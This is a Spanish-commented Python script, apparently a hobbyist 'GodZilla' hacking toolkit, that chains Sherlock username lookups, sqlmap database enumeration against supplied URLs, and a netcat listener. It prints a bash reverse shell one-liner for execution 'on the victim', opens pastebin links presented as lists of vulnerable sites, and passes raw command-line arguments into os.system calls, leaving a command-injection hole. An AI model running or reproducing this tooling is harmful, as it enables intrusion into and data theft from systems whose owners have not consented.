# importamos las librerías necesarias
from colorama import Fore, Back
from sys import argv
import os, sys, webbrowser

# declaramos los argumentos
para1 = argv
para2 = argv
para3 = argv

# configuramos los colores de colorama
BLACK = '\033[30m'
RED = '\033[31m'
GREEN = '\033[32m'
YELLOW = '\033[33m'
BLUE = '\033[34m'
MAGENTA = '\033[35m'
CYAN = '\033[36m'
WHITE = '\033[37m'
RESET = '\033[39m'

# hacemos las funciones principales

def error():
    print(Fore.RED + Back.RESET + '\n[?] Saliendo...')
    print(Fore.RESET + Back.RESET)
    sys.exit()

def list_sites():
    try:
        os.system('clear')
        title = '''
   ▄████████  ▄█      ███        ▄████████    ▄████████ 
  ███    ███ ███  ▀█████████▄   ███    ███   ███    ███ 
  ███    █▀  ███▌    ▀███▀▀██   ███    █▀    ███    █▀  
  ███        ███▌     ███   ▀  ▄███▄▄▄       ███        
▀███████████ ███▌     ███     ▀▀███▀▀▀     ▀███████████ 
         ███ ███      ███       ███    █▄           ███ 
   ▄█    ███ ███      ███       ███    ███    ▄█    ███ 
 ▄████████▀  █▀      ▄████▀     ██████████  ▄████████▀  
'''
        print(Fore.RED + Back.RESET + title)
        print('========================================================================================')
        webbrowser.open('https://pastebin.com/gA2ZhLUr') 
        webbrowser.open('https://pastebin.com/5MgPL3NX')
        webbrowser.open('https://pastebin.com/nakQ3T5W')
        print('========================================================================================')
        print('[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    except:
        error()

def sherlock():
    try:
        os.system('clear')
        title = '''
   ▄████████    ▄█    █▄       ▄████████    ▄████████  ▄█        ▄██████▄   ▄████████    ▄█   ▄█▄ 
  ███    ███   ███    ███     ███    ███   ███    ███ ███       ███    ███ ███    ███   ███ ▄███▀ 
  ███    █▀    ███    ███     ███    █▀    ███    ███ ███       ███    ███ ███    █▀    ███▐██▀   
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄      ▄███▄▄▄▄██▀ ███       ███    ███ ███         ▄█████▀    
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   ███       ███    ███ ███        ▀▀█████▄    
         ███   ███    ███     ███    █▄  ▀███████████ ███       ███    ███ ███    █▄    ███▐██▄   
   ▄█    ███   ███    ███     ███    ███   ███    ███ ███▌    ▄ ███    ███ ███    ███   ███ ▀███▄ 
 ▄████████▀    ███    █▀      ██████████   ███    ███ █████▄▄██  ▀██████▀  ████████▀    ███   ▀█▀ 
                                           ███    ███ ▀                                 ▀         
    '''
        print(Fore.RED + Back.RESET + title)

        print('========================================================================================')
        os.system(f'cd sherlock && cd sherlock && python3 sherlock.py {para2[2]}')
        print('========================================================================================')
        print('[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()
    
    except:
        error()


def install():
    try:
        os.system('clear')
        title = '''
 ▄█  ███▄▄▄▄      ▄████████     ███        ▄████████  ▄█        ▄█          ▄████████    ▄████████ 
███  ███▀▀▀██▄   ███    ███ ▀█████████▄   ███    ███ ███       ███         ███    ███   ███    ███ 
███▌ ███   ███   ███    █▀     ▀███▀▀██   ███    ███ ███       ███         ███    █▀    ███    ███ 
███▌ ███   ███   ███            ███   ▀   ███    ███ ███       ███        ▄███▄▄▄      ▄███▄▄▄▄██▀ 
███▌ ███   ███ ▀███████████     ███     ▀███████████ ███       ███       ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
███  ███   ███          ███     ███       ███    ███ ███       ███         ███    █▄  ▀███████████ 
███  ███   ███    ▄█    ███     ███       ███    ███ ███▌    ▄ ███▌    ▄   ███    ███   ███    ███ 
█▀    ▀█   █▀   ▄████████▀     ▄████▀     ███    █▀  █████▄▄██ █████▄▄██   ██████████   ███    ███ 
                                                     ▀         ▀                        ███    ███ 
    '''
        print(Fore.RED + Back.RESET + title)
        print('========================================================================================')
        os.system(f'sudo su && sudo apt-get update && apt-get install git -y && sudo apt-get install python3 && pip3 install colorama && pip3 install webbrowser && sudo apt-get install python3-pip && git clone https://github.com/sherlock-project/sherlock && git clone https://github.com/sqlmapproject/sqlmap')
        print('========================================================================================')
        print('[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    except:
        error()

def credits():
    try:
        os.system('clear')
        title = '''
 ▄████████    ▄████████    ▄████████ ████████▄   ▄█      ███        ▄████████ 
███    ███   ███    ███   ███    ███ ███   ▀███ ███  ▀█████████▄   ███    ███ 
███    █▀    ███    ███   ███    █▀  ███    ███ ███▌    ▀███▀▀██   ███    █▀  
███         ▄███▄▄▄▄██▀  ▄███▄▄▄     ███    ███ ███▌     ███   ▀   ███        
███        ▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███    ███ ███▌     ███     ▀███████████ 
███    █▄  ▀███████████   ███    █▄  ███    ███ ███      ███              ███ 
███    ███   ███    ███   ███    ███ ███   ▄███ ███      ███        ▄█    ███ 
████████▀    ███    ███   ██████████ ████████▀  █▀      ▄████▀    ▄████████▀  
             ███    ███                                                                                              
    '''
        print(Fore.RED + Back.RESET + title)
        print('========================================================================================')
        options = '''
    [?] Este proyecto ha sido creado por ZombieGeek0.
    [?] GitHub: https://www.github.com/ZombieGeek0.
    [?] GitHub del proyecto: https://github.com/ZombieGeek0/GodZilla.
    [?] Version 1.0.
    '''
        print(options)
        print('========================================================================================')
        print('[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()
    
    except:
        error()

def shell():
    try:
        os.system('clear')
        title = '''
   ▄████████    ▄█    █▄       ▄████████  ▄█        ▄█       
  ███    ███   ███    ███     ███    ███ ███       ███       
  ███    █▀    ███    ███     ███    █▀  ███       ███       
  ███         ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███       ███       
▀███████████ ▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███       ███       
         ███   ███    ███     ███    █▄  ███       ███       
   ▄█    ███   ███    ███     ███    ███ ███▌    ▄ ███▌    ▄ 
 ▄████████▀    ███    █▀      ██████████ █████▄▄██ █████▄▄██ 
                                         ▀         ▀         
    '''
        print(Fore.RED + Back.RESET + title)
        print('[?] Comando a ejecutar en la víctima: bash -i >& /dev/tcp/10.0.0.1/8080 0>&1')
        print('========================================================================================')
        os.system(f'nc -lvp {para3[3]}')
        print('========================================================================================')
        print('[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    except:
        error()

def helper():
    try:
        webbrowser.open('https://github.com/ZombieGeeK0/GodZilla')
        os.system('clear')
        title = '''
\033[31m   ▄█    █▄       ▄████████  ▄█      \033[34m    ▄███████▄    ▄████████    ▄████████ 
\033[31m  ███    ███     ███    ███ ███      \033[34m   ███    ███   ███    ███   ███    ███ 
\033[31m  ███    ███     ███    █▀  ███      \033[34m   ███    ███   ███    █▀    ███    ███ 
\033[31m ▄███▄▄▄▄███▄▄  ▄███▄▄▄     ███      \033[34m   ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
\033[31m▀▀███▀▀▀▀███▀  ▀▀███▀▀▀     ███      \033[34m ▀█████████▀  ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
\033[31m  ███    ███     ███    █▄  ███      \033[34m   ███          ███    █▄  ▀███████████ 
\033[31m  ███    ███     ███    ███ ███▌    ▄\033[34m   ███          ███    ███   ███    ███ 
\033[31m  ███    █▀      ██████████ █████▄▄██\033[34m  ▄████▀        ██████████   ███    ███ 
\033[31m                            ▀        \033[34m                             ███    ███ 
'''
        print(Fore.RED + Back.RESET + title)
        print('========================================================================================')
        options = '''
python3 godzilla.py -i   --> [Install the tools] 

python3 godzilla.py -s [username]   --> [Sherlock scanner]

python3 godzilla.py -c   --> [The credits] 

python3 godzilla.py -a -p [port]   --> [Attack with bash reverse shell]

python3 godzilla.py -h   --> [Help]

python3 godzilla.py -m -u [url]  --> [Scan with SqlMap]

python3 godzilla.py -l   --> [Open a vulnerable sites list]
'''

        print(options)
        print('========================================================================================')
        print('[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    except:
        error()

def sqlmap():
    try:
        os.system('clear')
        title = '''
   ▄████████ ████████▄    ▄█         ▄▄▄▄███▄▄▄▄      ▄████████    ▄███████▄ 
  ███    ███ ███    ███  ███       ▄██▀▀▀███▀▀▀██▄   ███    ███   ███    ███ 
  ███    █▀  ███    ███  ███       ███   ███   ███   ███    ███   ███    ███ 
  ███        ███    ███  ███       ███   ███   ███   ███    ███   ███    ███ 
▀███████████ ███    ███  ███       ███   ███   ███ ▀███████████ ▀█████████▀  
         ███ ███    ███  ███       ███   ███   ███   ███    ███   ███        
   ▄█    ███ ███  ▀ ███  ███▌    ▄ ███   ███   ███   ███    ███   ███        
 ▄████████▀   ▀██████▀▄█ █████▄▄██  ▀█   ███   █▀    ███    █▀   ▄████▀      
                         ▀                                                  
    '''
        print(Fore.RED + Back.RESET + title)

        print('========================================================================================')
        os.system(f'cd sqlmap &&python3 sqlmap.py -u "{para2[2]}" -dbs') 
        print('========================================================================================')
        print('[?] Proceso finalizado con éxito.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

    except:
        error()


# hacemos el menú
def menu():
    if para1[1] == '-i':
        install()

    elif para1[1] == '-s':
        sherlock()

    elif para1[1] == '-c':
        credits()

    elif para1[1] == '-a':
        shell() 

    elif para1[1] == '-h':
        helper()

    elif para1[1] == '-m':
        sqlmap()

    elif para1[1] == 'l':
        list_sites()

    else:
        print(Fore.RED + Back.RESET + '\n[?] Error: Revisa si has incluido todos los parámetros necesarios en la petición.')
        print(Fore.RESET + Back.RESET)
        sys.exit()

menu()
